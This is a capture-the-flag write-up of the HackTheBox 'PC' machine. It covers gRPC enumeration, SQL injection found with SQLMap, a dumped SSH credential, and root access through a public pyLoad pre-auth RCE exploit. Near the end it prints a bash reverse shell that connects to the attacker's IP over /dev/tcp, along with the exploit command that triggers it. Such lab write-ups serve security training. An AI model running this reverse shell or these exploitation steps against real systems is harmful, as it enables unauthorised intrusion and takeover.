---
title: HackTheBox - PC
date: 2023-06-20
author: Marius
tags: [ctf, 'Hack The Box', 'htb', 'linux']
---

Easy box found on HackTheBox.

### Enumeration

```
nmap -sV -sC -p- 10.10.11.214

Nmap scan report for 10.10.11.214
Host is up (0.040s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

### Exploitation

After fully enumerating the machine, I was only left with port, 50051 as an attack vector.

After doing some research I have found that port 50051 might be related to gRPC and I have found this [blog](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) explaining some attack techniques.

I've installed **grpcurl** and **grpcui** and verified that indeed port is running gRPC.

![stuff](/assets/img/pc/1.png)

I have registered a new user and called LoginUser method where I have received ID and token.

![grpc stuff](/assets/img/pc/2.png)
![grpc stuff](/assets/img/pc/3.png)
![grpc stuff](/assets/img/pc/4.png)
![grpc stuff](/assets/img/pc/5.png)

I have then intercepted the request and saved it to use with SQLMap, which found a SQLi vulnerability in ID field.

```
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:40645
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: l14qBp88ci6dm2cpfUuugIhGuJ0zgFCFpYA-zS5GPco
X-Requested-With: XMLHttpRequest
Content-Length: 193
Origin: http://127.0.0.1:40645
Connection: close
Referer: http://127.0.0.1:40645/
Cookie: _grpcui_csrf_token=l14qBp88ci6dm2cpfUuugIhGuJ0zgFCFpYA-zS5GPco
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibWFyaXVzIiwiZXhwIjoxNjg3Mjk0ODEwfQ.fBWPnJzZmT4HtlG339drklJrjnCfsQzM54E9-4t7GWo'"}],"data":[{"id":"630"}]}
```
I have dumped SQLite DB and got user credentials.

![stuff](/assets/img/pc/6.png)

sau:HereIsYourPassWord1431

Credentials were used to successfully log on as user **sau**.

### Privilege Escalation

After doing basic enumeration, I have noticed that the machine is hosting webserver on port 8000. I have created an SSH tunnel to access that service, as I did not have much luck with cURL.

```
sau@pc:~$ curl localhost:8000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2Flocalhost%3A8000%2F">/login?next=http%3A%2F%2Flocalhost%3A8000%2F</a>. If not, click the link.
```

```
ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
```

![stuff](/assets/img/pc/7.png)

Looks like a pyLoad service is running. I have checked what version it's running and found a valid pre-auth RCE [exploit](https://www.exploit-db.com/exploits/51522)
.
```
sau@pc:~$ pyload --version
pyLoad 0.5.0
```

I have created a reverse shell script in temp folder and executed RCE script and received a root shell.

```
sau@pc:/tmp$ cat r.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.84/80 0>&1
```

```
└─$ python exploit.py -u http://127.0.0.1:8000 -c "bash /tmp/r.sh"
[+] Check if target host is alive: http://127.0.0.1:8000
[+] Host up, let's exploit! 
```

![stuff](/assets/img/pc/8.png)

